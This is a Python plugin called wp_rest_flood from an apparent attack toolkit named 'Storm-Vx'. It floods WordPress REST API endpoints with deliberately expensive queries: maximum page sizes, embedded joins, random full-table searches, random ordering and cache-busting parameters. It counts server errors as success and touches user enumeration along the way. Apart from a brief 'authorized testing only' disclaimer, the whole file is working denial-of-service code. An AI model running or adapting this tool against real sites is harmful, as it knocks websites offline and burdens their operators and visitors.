#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
vf_wp_rest_flood — WordPress REST API Flood Attack Plugin

WP REST API (/wp-json/wp/v2/*) provides heavy database endpoints:
- /wp-json/wp/v2/posts → Full post query with JOINs
- /wp-json/wp/v2/pages → Page query
- /wp-json/wp/v2/comments → Comment query
- /wp-json/wp/v2/users → User enumeration (info leak!)
- /wp-json/wp/v2/categories → Taxonomy query
- /wp-json/wp/v2/media → Media library query
- /wp-json/wp/v2/search → Full search (WP 5.0+)

Amplification strategies:
- per_page=100 → Maximum result set (heavy DB query)
- _embed=1 → Embed related resources (complex JOINs)
- search=<random> → Full table scan (LIKE %term%)
- orderby=rand → Random ordering (no index usage)
- Multiple endpoints → Different DB tables hit

Amplification: ~4x per request (complex JOINs + large result sets)

Part of the Storm-Vx plugin architecture.

FOR AUTHORIZED TESTING ONLY!
"""

from __future__ import annotations

import asyncio
import time
import random
from typing import Dict, Any, List
from urllib.parse import urlencode, quote

import aiohttp

from plugin_system import PluginMeta, AttackContext
from tester.vf_attack_base import AttackPlugin, ResponseClass
from vf_common import rand_str, rand_cache_bust

from logging_config import get_logger
logger = get_logger(__name__)


__all__ = ["WpRestFloodPlugin"]


# REST API endpoints with their query parameters
_WP_REST_ENDPOINTS: List[Dict[str, Any]] = [
    # Posts — heaviest query
    {"path": "/wp-json/wp/v2/posts", "params": {
        "per_page": "100", "_embed": "1",
        "search": None,  # Will be filled with random
        "orderby": "rand",
    }},
    # Pages — also heavy
    {"path": "/wp-json/wp/v2/pages", "params": {
        "per_page": "100", "_embed": "1",
        "search": None,
    }},
    # Comments — DB-heavy with JOINs
    {"path": "/wp-json/wp/v2/comments", "params": {
        "per_page": "100",
        "search": None,
    }},
    # Users — info leak + DB query
    {"path": "/wp-json/wp/v2/users", "params": {
        "per_page": "100",
    }},
    # Categories — taxonomy query
    {"path": "/wp-json/wp/v2/categories", "params": {
        "per_page": "100",
        "search": None,
    }},
    # Tags — taxonomy query
    {"path": "/wp-json/wp/v2/tags", "params": {
        "per_page": "100",
        "search": None,
    }},
    # Media — attachment queries
    {"path": "/wp-json/wp/v2/media", "params": {
        "per_page": "100",
        "search": None,
    }},
    # Search — full text search (WP 5.0+)
    {"path": "/wp-json/wp/v2/search", "params": {
        "per_page": "100",
        "search": None,
        "subtype": "any",
    }},
    # Types — post type enumeration
    {"path": "/wp-json/wp/v2/types", "params": {}},
    # Taxonomies — taxonomy enumeration
    {"path": "/wp-json/wp/v2/taxonomies", "params": {}},
    # Root discovery — lists ALL endpoints (heavy discovery)
    {"path": "/wp-json/", "params": {}},
    # WP REST index
    {"path": "/wp-json/wp/v2", "params": {}},
]


class WpRestFloodPlugin(AttackPlugin):
    """WordPress REST API flood — heavy DB queries with _embed and search.

    The WP REST API is powerful for load testing because:
    1. _embed=1 causes complex JOINs (posts + authors + featured media + terms)
    2. per_page=100 returns maximum rows (no caching for large sets)
    3. search=<random> forces full table scan (LIKE query)
    4. Multiple endpoints spread load across different DB tables
    5. Some caching plugins don't cache REST API responses at all
    """

    meta = PluginMeta(
        name='wp_rest_flood',
        version='1.0.0',
        plugin_type='attack',
        description='WordPress REST API flood — heavy DB queries with _embed and search (4x amplification)',
        tags=['http', 'wordpress', 'rest', 'db-burn', 'amplification'],
        priority=21,
        compatible_profiles=[],
        requirements=['aiohttp'],
    )

    async def _worker_loop(self, context: AttackContext, worker_id: int) -> None:
        """WP REST API flood worker: heavy DB queries via REST endpoints."""
        _ssl = context.ssl_param
        site_root = context.site_root
        delay_ms = context.extra.delay_ms

        while not self._stop_event.is_set():
            try:
                # Pick a random REST endpoint
                endpoint = random.choice(_WP_REST_ENDPOINTS)
                path = endpoint["path"]
                params = dict(endpoint.get("params", {}))

                # Fill in search parameter with random term
                # BUG-FIX v35: Use "search" in params to check key existence
                # (params.get("search") is None is True even when key doesn't exist,
                #  causing KeyError on del params["search"] for endpoints without search)
                if "search" in params and params["search"] is None:
                    if random.random() < 0.6:
                        # Random search term for full table scan
                        search_term = rand_str(random.randint(3, 8))
                        # Sometimes use Unicode/Persian for heavier processing
                        if random.random() < 0.3:
                            search_term = quote(f"تست{rand_str(3)}")
                        params["search"] = search_term
                    else:
                        del params["search"]

                # Build URL
                url = f"{site_root}{path}"
                if params:
                    url += f"?{urlencode(params)}"

                # Add cache busting
                url += f"{'&' if '?' in url else '?'}{rand_cache_bust()}"

                # Use API-type headers
                headers = self._get_fresh_headers(context, "api")
                headers["Accept"] = "application/json"

                t = time.monotonic()
                try:
                    async with context.session.get(
                        url, headers=headers,
                        ssl=_ssl, allow_redirects=False,
                    ) as resp:
                        rt = time.monotonic() - t
                        resp_headers = dict(resp.headers)
                        response_class = self._process_response(
                            resp.status, resp_headers,
                            url=url[:60], worker_id=worker_id
                        )
                        # REST API: 200 (results), 400 (bad param=still processed),
                        # 401/403 (auth required), 404 (endpoint disabled=still hit WP),
                        # 500 (DB error=overloaded!)
                        # BUG-FIX v35: NOT_FOUND counts as ok because WP REST still
                        # bootstrapped PHP and processed the routing even if the
                        # specific REST endpoint is disabled or returns no results
                        ok = response_class in (
                            ResponseClass.OK, ResponseClass.AUTH_REQUIRED,
                            ResponseClass.SERVER_ERROR, ResponseClass.REDIRECT,
                            ResponseClass.NOT_FOUND
                        )
                        self._capture_response_cookies(resp, context)
                        # Show which endpoint was hit
                        hint = path.replace("/wp-json/", "")
                        await self._record(
                            "WP-REST", ok, resp.status, rt,
                            url=url[:60], hint=hint,
                        )
                except asyncio.CancelledError:
                    raise
                except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                    rt = time.monotonic() - t
                    self._on_request_result(worker_id, False)
                    await self._record(
                        "WP-REST", False, 0, rt,
                        err=type(exc).__name__, url=url[:60],
                    )

                # Adaptive sleep
                await self._adaptive_sleep(worker_id, delay_ms)

            except asyncio.CancelledError:
                return
            except (aiohttp.ClientError, asyncio.TimeoutError, OSError) as exc:
                self._on_request_result(worker_id, False)
                await self._record("WP-REST", False, 0, 0, err=type(exc).__name__)
                await asyncio.sleep(0.1)
